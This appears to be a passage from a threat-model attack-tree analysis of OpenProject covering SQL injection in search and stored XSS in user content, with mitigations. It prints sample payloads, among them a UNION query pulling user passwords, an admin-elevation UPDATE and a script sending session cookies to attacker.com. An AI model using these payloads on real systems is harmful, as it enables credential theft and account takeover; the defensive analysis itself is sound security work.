### 4. Deep Analysis of Attack Tree Path

#### 4.1. 2.1. SQL Injection in OpenProject Database Queries [HIGH-RISK PATH]

**4.1.1. 2.1.1. Exploiting Vulnerable Search Functionality (OpenProject Search) [HIGH-RISK PATH]**

*   **Vulnerability Definition: SQL Injection**

    SQL Injection (SQLi) is a code injection vulnerability that occurs when user-supplied input is incorporated into SQL queries without proper sanitization or parameterization. This allows attackers to inject malicious SQL code, which is then executed by the database server.

*   **Attack Vector Analysis (OpenProject Context): OpenProject Search Functionality**

    OpenProject, like many web applications, likely provides search functionality across various modules (tasks, work packages, wiki pages, users, etc.).  If the search functionality is implemented in a way that directly concatenates user-provided search terms into SQL queries, it becomes vulnerable to SQL injection.

    **Example Scenario (Illustrative - Requires OpenProject Code Analysis for Confirmation):**

    Let's assume OpenProject uses a SQL query similar to this for searching work packages:

    ```sql
    SELECT * FROM work_packages WHERE title LIKE '%[user_search_term]%' OR description LIKE '%[user_search_term]%';
    ```

    If `[user_search_term]` is directly replaced with user input without proper sanitization, an attacker can inject malicious SQL code.

*   **Exploitation Scenario:**

    1.  **Identify Search Functionality:** An attacker identifies a search feature in OpenProject (e.g., work package search).
    2.  **Craft Malicious Payload:** The attacker crafts a malicious search term containing SQL injection code. For example, to extract the database version, they might use:

        ```
        %'; SELECT version(); --
        ```

        This payload attempts to:
        *   Terminate the original `LIKE` clause with `%';`.
        *   Execute a new SQL command `SELECT version();` to retrieve the database version.
        *   Comment out the rest of the original query using `--`.

    3.  **Inject Payload:** The attacker enters this crafted search term into the OpenProject search field and submits the query.
    4.  **Database Execution:** If the OpenProject application is vulnerable, the backend code will construct a SQL query incorporating the malicious payload, and the database server will execute the injected SQL code.
    5.  **Data Exfiltration/Manipulation:** In this example, the database version would be returned in the search results (or potentially in error messages).  More sophisticated payloads could be used to:
        *   **Bypass Authentication:**  `' OR '1'='1` (always true condition to bypass login).
        *   **Extract Sensitive Data:** `UNION SELECT username, password FROM users --` (attempt to retrieve user credentials).
        *   **Modify Data:** `UPDATE users SET role = 'admin' WHERE username = 'victim_user' --` (elevate privileges).
        *   **Denial of Service:** Inject queries that consume excessive database resources.

*   **Impact Assessment:**

    *   **Database Compromise (High):** Successful SQL injection can lead to full database compromise. Attackers can:
        *   **Confidentiality Breach:** Access and exfiltrate sensitive data like user credentials, project information, financial data, and confidential documents stored in the database.
        *   **Integrity Violation:** Modify or delete critical data, leading to data corruption, application malfunction, and loss of trust.
        *   **Availability Disruption:**  Cause denial of service by overloading the database server or corrupting essential data.
        *   **Lateral Movement:** Potentially gain access to the underlying operating system and other systems connected to the database server.

*   **Mitigation Strategies:**

    *   **Parameterized Queries (Prepared Statements):**  **Primary Mitigation:**  Use parameterized queries or prepared statements for all database interactions. This separates SQL code from user input, preventing injection.  OpenProject should utilize its ORM (likely Ruby on Rails' ActiveRecord) to enforce parameterized queries.
    *   **Input Validation and Sanitization:**  While not a primary defense against SQLi, input validation can help. Sanitize user input by:
        *   **Whitelisting:**  Allowing only specific characters or patterns in input fields.
        *   **Escaping Special Characters:**  Escaping characters that have special meaning in SQL (e.g., single quotes, double quotes). **However, escaping alone is often insufficient and error-prone for SQLi prevention.**
    *   **Principle of Least Privilege:**  Grant database users used by OpenProject applications only the necessary permissions. Avoid using database accounts with `root` or `DBA` privileges.
    *   **Web Application Firewall (WAF):**  Implement a WAF to detect and block common SQL injection attack patterns.
    *   **Regular Security Audits and Penetration Testing:**  Conduct regular security audits and penetration testing, specifically focusing on input validation and SQL injection vulnerabilities in search functionalities and other user input points.
    *   **Security Code Reviews:**  Implement mandatory security code reviews to identify and fix potential SQL injection vulnerabilities during development.
    *   **Error Handling:**  Avoid displaying detailed database error messages to users, as these can reveal information useful for attackers. Implement generic error messages and log detailed errors securely for debugging.
    *   **ORM Best Practices:** Ensure the development team is trained on and adheres to the best practices of the ORM framework used by OpenProject to prevent SQL injection.

#### 4.2. 2.2. Cross-Site Scripting (XSS) in OpenProject Features [HIGH-RISK PATH]

**4.2.1. 2.2.1. Stored XSS in Task Descriptions, Comments, Wiki Pages, Forum Posts [HIGH-RISK PATH]**

*   **Vulnerability Definition: Stored Cross-Site Scripting (XSS)**

    Stored XSS (also known as persistent XSS) occurs when malicious scripts injected by an attacker are stored on the server (e.g., in a database, file system, or message queue). When other users access the stored data, the malicious script is executed in their browsers.

*   **Attack Vector Analysis (OpenProject Context): User-Generated Content Areas**

    OpenProject allows users to create and modify content in various areas, including:
    *   Task Descriptions
    *   Comments on Work Packages
    *   Wiki Pages
    *   Forum Posts

    If OpenProject does not properly sanitize or encode user input in these areas before storing it in the database and displaying it to other users, it becomes vulnerable to stored XSS.

*   **Exploitation Scenario:**

    1.  **Identify Vulnerable Input Field:** An attacker identifies an input field in OpenProject where they can inject JavaScript code that will be stored and displayed to other users (e.g., a task description field).
    2.  **Craft Malicious Payload:** The attacker crafts a malicious JavaScript payload. A simple example is:

        ```html
        <script>alert('XSS Vulnerability!')</script>
        ```

        More sophisticated payloads could be:
        *   **Session Cookie Theft:** `<script>window.location='http://attacker.com/steal_cookie?cookie='+document.cookie;</script>` (sends the victim's session cookie to an attacker-controlled server).
        *   **Redirection to Malicious Site:** `<script>window.location='http://malicious-phishing-site.com';</script>` (redirects the user to a phishing site).
        *   **Defacement:**  `<script>document.body.innerHTML = '<h1>You have been hacked!</h1>';</script>` (replaces the page content with defacement message).
        *   **Keylogging:**  More complex JavaScript to capture user keystrokes.

    3.  **Inject Payload:** The attacker injects this malicious payload into a vulnerable input field (e.g., task description) and saves the content.
    4.  **Victim Accesses Content:** When another user views the task, wiki page, comment, or forum post containing the malicious payload, the stored JavaScript code is retrieved from the database and executed by the victim's browser.
    5.  **Malicious Action Execution:** The injected JavaScript performs the attacker's intended actions within the victim's browser context.

*   **Impact Assessment:**

    *   **Account Takeover (High):**  Session cookie theft via XSS can lead to immediate account takeover. Attackers can impersonate the victim user and perform actions on their behalf.
    *   **Data Breach (Medium to High):**  Depending on the malicious script, attackers might be able to access sensitive data displayed on the page or accessible through the victim's session.
    *   **Defacement (Medium):**  Defacing pages can damage the application's reputation and disrupt user experience.
    *   **Phishing Attacks (Medium to High):**  Redirection to phishing sites can trick users into revealing credentials or sensitive information.
    *   **Malware Distribution (Medium):**  XSS can be used to redirect users to sites hosting malware.
    *   **Reputation Damage (High):**  Repeated XSS vulnerabilities can severely damage user trust and the reputation of OpenProject.

*   **Mitigation Strategies:**

    *   **Output Encoding (Context-Aware Encoding):** **Primary Mitigation:**  Encode user-generated content before displaying it in web pages. Use context-aware encoding appropriate for the output context (HTML, JavaScript, URL, CSS). For HTML context, use HTML entity encoding.  OpenProject should leverage its templating engine (likely ERB in Ruby on Rails) to automatically encode output.
    *   **Content Security Policy (CSP):**  Implement a strong CSP to control the resources that the browser is allowed to load. This can significantly reduce the impact of XSS attacks by limiting the actions malicious scripts can perform.
    *   **Input Validation (Limited Effectiveness for XSS):**  While input validation can help, it's not a primary defense against XSS.  Focus on output encoding. Input validation can be used to reject obviously malicious input, but it's difficult to create comprehensive input validation rules that prevent all XSS attacks.
    *   **HTML Sanitization Libraries:**  For rich text input (e.g., in wiki pages), use a robust HTML sanitization library (like `Sanitize` in Ruby) to remove or neutralize potentially harmful HTML tags and attributes while allowing safe formatting.
    *   **Regular Security Audits and Penetration Testing:**  Conduct regular security audits and penetration testing, specifically focusing on XSS vulnerabilities in all user input and output points.
    *   **Security Code Reviews:**  Implement mandatory security code reviews to identify and fix potential XSS vulnerabilities during development.
    *   **Framework Security Features:**  Utilize the security features provided by the framework (Ruby on Rails) to prevent XSS, such as automatic output encoding and CSP helpers.
    *   **Educate Users:**  While not a technical mitigation, educating users about the risks of clicking on suspicious links or running untrusted scripts can help reduce the impact of XSS attacks.
